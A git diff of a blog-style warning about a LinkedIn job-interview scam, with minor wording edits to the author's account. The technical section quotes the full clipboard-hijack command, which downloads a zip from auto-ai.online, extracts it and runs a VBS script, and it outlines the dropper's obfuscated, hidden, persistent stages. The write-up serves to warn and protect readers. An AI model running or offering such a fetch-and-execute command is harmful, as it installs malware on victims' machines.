@@ -2,7 +2,7 @@
 
 This is the story of a sophisticated job interview scam that happened to me on LinkedIn using social engineering and a heavily obfuscated clipboard hijacking to push a malicious payload.
 
-I spotted the scam pretty quickly and tried to schedule a phone call or video interview to see how far this scam goes but aside from a LinkedIn conversation (which honestly could have been with an LLM) couldn't directly get in touch with the scammers. I am sharing this to serve as a warning to other and provide ways you can protect yourselves as AI tooling makes attacks such as this further possible to bad actors online.
+I spotted the scam pretty quickly and tried to schedule a phone call or video interview to see how far this scam goes but aside from a LinkedIn conversation (which honestly could have been with an LLM) couldn't directly get in touch with the scammers. I am sharing this to serve as a warning and provide ways you can protect yourselves as AI tooling makes attacks such as this further possible to bad actors online.
 
 I have written the story in the section below, but if you just want to see the technical details of the attack then scroll down to [Technical Details](#technical-details).
 
@@ -14,14 +14,14 @@ I received a message on LinkedIn from a profile with the name [Aftab Habib](http
 
 Right off that bat this seemed a bit sus. No actual job description. I check Galaxy's career section and do not see this "fully remote portfolio manager" job. Alright, let's see how far deep the rabbit hole goes.
 
-I message back to ask for a job description, here it is.
+I messaged back to ask for a job description, here it is.
 
 ![job_description](./screenshots/aftab-2.png)
 ![job_description](./screenshots/aftab-3.png)
 
-Honestly that looks kind of legit! I'm sure it's lifted from elsewhere and ran through some gpt.
+Honestly that looks kind of legit! I'm sure it's lifted from elsewhere and ran through some gpt, but not too shabby!
 
-Then he sends me a message to butter me up which is clearly copy/pasted from ChatGPT where he has fed my LinkedIn profile.
+Then he sends me a message to butter me up which is clearly copy/pasted from ChatGPT where he has fed my profile.
 
 ![message](./screenshots/aftab-4.png)
 
@@ -74,13 +74,13 @@ Now that my friends, looks sus af 🚨.
 
 That's the scam. A clipboard hijack to "fix your drivers" which would download a zipped payload from a remote server auto-ai.online and run on your machine.
 
-If you want to get into the weeds of what the actual attack might be, then read on below in the [Technical Details](#technical-details)
+If you want to get into the weeds of what the actual attack might be, then read on below in the [Technical Details](#technical-details).
 
 # Final Words
 
 As of now the profile of our LinkedIn Premium member / aspiring scammer [Aftab Habib](https://www.linkedin.com/in/aftab-habib-965479297/) is still up. I presume he'll block me immediately upon seeing this. I plan to report his profile to LinkedIn + [Galaxy Digital](https://www.linkedin.com/company/galaxyhq) that there are scammers impersonating their staff (doubt it'll be news to them, however). Lastly, I plan to report his bogus registrations to Hostinger see how they respond.
 
-If you can think of anything else I should be doing, please do let me know! I really wish I could've scheduled a video call with Aftab to have a lovely chat about his operation.
+If you can think of anything else I should be doing, please do let me know! I really wish I could've scheduled a video call with Aftab to have a lovely chat about his operation. Maybe see how his day is going.
 
 Now if you've read this far, read this section too:
 
@@ -113,7 +113,7 @@ While a technical person would likely be alerted already at this stage, I presum
 
 `curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"`
 
-Not so friendly now. I presume the average user who wouldn't open a terminal would just copy/paste and hit enter without thinking about it twice.
+Doesn't look  so friendly now, does it? I presume the average user who would open a terminal also would just copy/paste and hit enter without thinking about it twice.
 
 ### Clipboard Hijacking Mechanism
 
@@ -174,10 +174,10 @@ I loaded a VM and downloaded the payload. A screenshot of the zip file's content
 
 **What the VBS script does:**
 
-1. **Stage 1:** Extracts `dll.zip` using `tar -xf` command
-2. **Stage 2:** Executes `chost.exe audiodriver.py` (runs in background)
+1. Extracts `dll.zip` using `tar -xf` command
+2. Executes `chost.exe audiodriver.py` (runs in background)
 3. **Obfuscation:** Uses string concatenation to hide commands (`"ch" & "ost.exe"`)
-4. **Stealth:** Runs commands with hidden windows (`0` parameter)
+4. **Stealth:** Runs commands with hidden windows
 
 I looked at the python code, and they're putting in registry entries to start the binaries at startup, so this attack will be scanning the system continuously for anything of value.
 
